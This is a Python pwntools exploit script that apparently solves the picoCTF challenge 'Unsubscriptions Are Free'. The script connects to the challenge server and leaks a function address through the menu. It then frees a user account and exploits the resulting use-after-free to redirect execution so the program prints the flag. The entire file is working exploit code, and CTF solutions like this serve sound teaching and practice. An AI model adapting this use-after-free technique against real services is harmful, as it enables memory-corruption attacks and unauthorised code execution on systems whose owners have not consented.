# picoCTF-unsubscriptions-are-free-exploit.py
# by Aidan Wech (ahwech)
# nc mercury.picoctf.net 61817

from pwn import *

def main():
    host = "mercury.picoctf.net"
    port = 61817

    p = remote(host, port)

    # make account
    p.recvuntil(b"(e)xit\n", timeout=1)
    p.sendline(b"m")
    p.recvuntil(b"username: \n")
    p.sendline(b"ABC")

    # leak memory address of exploit function
    p.recvuntil(b"(e)xit\n", timeout=1)
    p.sendline(b"s")
    flag_addr = int(p.recvline(timeout=1).decode("utf-8").rstrip("\n").split("...")[1][2:], 16)

    # free account
    p.recvuntil(b"(e)xit\n", timeout=1)
    p.sendline(b"i")
    p.recvuntil(b"(Y/N)?\n", timeout=1)
    p.sendline(b"y")

    # UAF to overwrite return address
    p.recvuntil(b"(e)xit\n", timeout=1)
    p.sendline(b"l")
    p.recvuntil(b"anyways:\n", timeout=1)
    p.send(p64(flag_addr))
    flag = p.recvline(timeout=1).decode("utf-8").rstrip("\n")

    # exit program
    p.recvuntil(b"(e)xit\n", timeout=1)
    p.sendline(b"e")
    p.close()

    # show flag
    log.info(f"flag: {flag}")


if __name__ == "__main__":
    main()